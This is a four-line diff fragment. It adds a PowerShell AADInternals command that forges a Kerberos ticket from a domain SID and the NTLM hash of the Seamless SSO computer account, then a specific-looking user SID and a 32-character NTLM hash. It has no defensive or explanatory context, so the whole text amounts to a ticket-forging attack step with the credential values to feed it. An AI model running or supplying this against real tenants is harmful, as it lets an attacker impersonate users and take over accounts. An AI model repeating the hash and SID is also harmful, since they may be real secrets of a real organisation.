@@ -1,0 +1,4 @@
+$kerberosTicket=New-AADIntKerberosTicket -SidString <Internal AD SID> -Hash <SSOACC$ NTLM Hash>.
+
+S-1-5-21-1610179471-940857584-1233803906-46657
+5978ae40e23765629b81cbbbc52bb5fb
